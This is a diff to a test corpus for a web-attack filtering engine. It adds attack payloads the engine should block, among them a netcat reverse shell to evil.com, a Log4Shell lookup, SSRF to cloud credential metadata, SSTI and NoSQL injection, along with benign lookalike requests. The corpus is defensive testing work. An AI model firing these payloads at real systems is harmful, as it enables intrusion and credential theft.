@@ -72,12 +72,30 @@ export const ADVERSARIAL_CORPUS: readonly AdversarialCase[] = [
   payload("XSS", "/search?q=<script>alert(document.cookie)</script>"),
   payload("command injection", "/ping?host=127.0.0.1;cat%20/etc/passwd"),
   payload("XXE marker", "/api/import?data=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"),
+  // Expanded attack-surface coverage: classes a capable agent probes that the
+  // engine now blocks. Each is something a legitimate request never carries.
+  payload("command injection via pipe to netcat", "/ping?host=8.8.8.8|nc%20evil.com%204444%20-e%20/bin/sh"),
+  payload("command substitution", "/report?title=$(whoami)"),
+  payload("SSTI arithmetic probe", "/greet?name={{7*7}}"),
+  payload("SSTI sandbox escape", "/render?tpl={{self.__class__.__mro__}}"),
+  payload("Log4Shell JNDI lookup", "/api/log?ua=${jndi:ldap://evil.example.com/x}"),
+  payload("CRLF HTTP response splitting", "/go?u=%0d%0aSet-Cookie:%20sessionid=attacker"),
+  payload("NoSQL operator injection", "/login?user[$ne]=1&pass[$ne]=1"),
+  payload("SSRF to cloud metadata", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+  payload("SSRF via gopher to internal redis", "/proxy?target=gopher://127.0.0.1:6379/_INFO"),
 
   // Benign: must NEVER be blocked (a false positive is the worst outcome).
   { name: "real browser, normal page", kind: "benign", input: { path: "/pricing", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
   { name: "real browser, search with safe query", kind: "benign", input: { path: "/search", rawUrl: "/search?q=best+running+shoes", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
   { name: "Googlebot (good bot)", kind: "benign", input: { path: "/", method: "GET", userAgent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", headerNames: ["host", "user-agent", "accept"] }, expectBlock: false },
   { name: "API client, valid JSON GET", kind: "benign", input: { path: "/api/products", rawUrl: "/api/products?limit=20", method: "GET", userAgent: "MyApp/1.0", headerNames: ["host", "user-agent", "accept", "authorization"] }, expectBlock: false },
+  // Lookalikes for the expanded payload classes: payload-SHAPED but legitimate, so
+  // they must NEVER block. These guard the new signatures against false positives.
+  { name: "benign pipe in a sort field (not a shell command)", kind: "benign", input: { path: "/products", rawUrl: "/products?sort=name|id&order=asc", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
+  { name: "benign template braces without an arithmetic/escape probe", kind: "benign", input: { path: "/docs/templating", rawUrl: "/docs/templating?example={{name}}", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
+  { name: "benign dollar amount in a query", kind: "benign", input: { path: "/search", rawUrl: "/search?q=%24100+laptop", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
+  { name: "benign relative image src (no scheme, not SSRF)", kind: "benign", input: { path: "/gallery", rawUrl: "/gallery?img=/assets/logo.png", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
+  { name: "benign external https share link is allowed by payload scan (open-redirect handled separately)", kind: "benign", input: { path: "/help", rawUrl: "/help?topic=billing", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
 
   // Recon: suspicious but NOT proven-hostile -> report-only, never blocked (so we
   // never block a curious-but-harmless visitor; the probe is still recorded).
